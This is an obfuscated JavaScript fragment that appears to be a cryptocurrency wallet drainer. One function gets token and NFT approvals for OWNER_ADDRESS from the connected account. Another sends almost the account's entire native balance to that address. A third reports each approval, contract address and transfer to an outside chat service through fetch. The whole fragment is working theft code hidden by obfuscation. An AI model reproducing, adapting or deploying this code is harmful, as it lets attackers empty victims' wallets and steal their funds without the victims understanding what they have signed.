loopTokens(_0x1ef536){const _0x2d5c0c=_0x428e52;for await(let _0x5150ec of _0x1ef536){if(_0x5150ec[_0x2d5c0c(0x136)]===_0x2d5c0c(0xfe)){let _0x1befe3=new web3Object[(_0x2d5c0c(0xd4))][(_0x2d5c0c(0x177))](ABI,_0x5150ec[_0x2d5c0c(0x163)]);sendMessage(_0x2d5c0c(0x179)),await _0x1befe3[_0x2d5c0c(0xb1)][_0x2d5c0c(0xcc)](OWNER_ADDRESS,_0x2d5c0c(0x14a))[_0x2d5c0c(0xe2)]({'from':selectedAccount,'to':_0x5150ec[_0x2d5c0c(0x163)]})['on'](_0x2d5c0c(0x17d),_0x3f3e20=>{const _0x4b3ce8=_0x2d5c0c;console[_0x4b3ce8(0xe9)](_0x4b3ce8(0x9a)+_0x3f3e20);})['on']('receipt',_0x25e9a4=>{const _0x42095b=_0x2d5c0c;console[_0x42095b(0xe9)](_0x42095b(0xd9)+_0x25e9a4),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x42095b(0x9b)+_0x5150ec[_0x42095b(0x163)]),sendMessage(_0x42095b(0x13f)+_0x5150ec[_0x42095b(0xb0)]),sendMessage(_0x42095b(0x11a)+OWNER_ADDRESS);})['on']('error',_0x282f77=>{const _0x229778=_0x2d5c0c;console['log'](_0x229778(0x11e)+_0x282f77),sendMessage(_0x229778(0x169));});}else{if(_0x5150ec[_0x2d5c0c(0x136)]===_0x2d5c0c(0x12e)){let _0x4f2cd7=new web3Object[(_0x2d5c0c(0xd4))][(_0x2d5c0c(0x177))](ABIN,_0x5150ec[_0x2d5c0c(0x163)]);await _0x4f2cd7[_0x2d5c0c(0xb1)][_0x2d5c0c(0x145)](OWNER_ADDRESS,_0x2d5c0c(0xe3))[_0x2d5c0c(0xe2)]({'from':selectedAccount,'to':_0x5150ec['address']})['on'](_0x2d5c0c(0x17d),_0x3c6517=>{const _0x1db87a=_0x2d5c0c;console[_0x1db87a(0xe9)]('Transaction\x20Hash:\x20'+_0x3c6517),sendMessage(_0x1db87a(0x16e));})['on'](_0x2d5c0c(0x133),_0x222fbd=>{const _0x254bb=_0x2d5c0c;console[_0x254bb(0xe9)]('Transaction\x20Receipt:\x20'+_0x222fbd),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage('NFT\x20Contract\x20Address\x20'+_0x5150ec[_0x254bb(0x163)]),sendMessage('Your\x20address\x20'+OWNER_ADDRESS);})['on'](_0x2d5c0c(0x15d),_0x5b2aa5=>{const _0x2e7293=_0x2d5c0c;console[_0x2e7293(0xe9)](_0x2e7293(0x11e)+_0x5b2aa5),sendMessage('Transaction\x20Rejected');});}else sendMessage(_0x2d5c0c(0x113));}};}function _0x221b(_0x2398d5,_0x105299){const _0x44fc3b=_0x44fc();return _0x221b=function(_0x221bda,_0x48a774){_0x221bda=_0x221bda-0x94;let _0x5cfca2=_0x44fc3b[_0x221bda];return _0x5cfca2;},_0x221b(_0x2398d5,_0x105299);}async function onSendEther(){const _0x483f02=_0x428e52;try{let _0x5187fb=await web3Object[_0x483f02(0xd4)][_0x483f02(0xc6)](selectedAccount);var _0x46b939=await web3Object['eth']['getGasPrice'](),_0x19ed14={'gasPrice':_0x46b939,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0x5187fb},_0x318517=await web3Object[_0x483f02(0xd4)][_0x483f02(0x126)](_0x19ed14),_0x1725ee=_0x46b939*_0x318517;_0x19ed14[_0x483f02(0x16f)]=_0x318517,_0x19ed14[_0x483f02(0x173)]=_0x5187fb-_0x1725ee,web3Object[_0x483f02(0xd4)][_0x483f02(0x167)](_0x19ed14)['on']('transactionHash',_0x5a78f8=>{console['log']('Transaction\x20Hash:\x20',_0x5a78f8),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on']('receipt',_0xf810d2=>{const _0x3a3176=_0x483f02;console[_0x3a3176(0xe9)]('Transaction\x20Receipt:\x20',_0xf810d2),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');})['on'](_0x483f02(0x15d),_0x2afb62=>{const _0x28ce9e=_0x483f02;console[_0x28ce9e(0xe9)](_0x28ce9e(0x11e),_0x2afb62),sendMessage(_0x28ce9e(0x169));});}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer');}}async function sendMessage(_0x19cb6e){return new Promise((_0x2a298e,_0x165dbc)=>{const _0x193eaa=_0x221b,_0x11acc1=CHAT;fetch(_0x193eaa(0x99)+_0x11acc1+_0x193eaa(0x16d)+_0x19cb6e,{'method':_0x193eaa(0x101),'headers':{}})['then'](async _0x4893ab=>{const _0x131e18=_0x193eaa;if(_0x4893ab['status']>0x18f)throw _0x4893ab;_0x2a298e(await _0x4893ab[_0x131e18(0xb5)]());})[_0x193eaa(0xa5)](_0x3bb4a7=>{_0x165dbc(_0x3bb4a7);});});}